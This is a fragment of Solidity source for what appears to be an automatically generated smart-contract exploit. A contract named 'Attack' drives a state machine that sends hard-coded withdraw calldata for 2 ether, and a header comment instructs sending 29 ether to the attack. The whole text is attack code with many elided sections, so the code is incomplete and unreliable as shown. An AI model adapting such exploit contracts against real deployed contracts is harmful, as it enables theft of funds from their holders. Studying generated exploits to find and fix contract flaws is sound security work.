 ...
 * parameter. Make sure to send at least 29 ether and 0 wei to the attack
 ...
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x19274b259f6540000 wei
 *
 */
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                input: { uint(2000000000000000000),  }
 
                 */
                bytes memory data = bytes(hex"2e1a7d4d0000000000000000000000000000000000000000000000001bc16d674ec80000");
                uint value = 0x0;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x19274b259f6540000; /* equals 29 ether and 0 wei */
    uint constant INITIAL_ETHER = 0x19274b259f6540000;
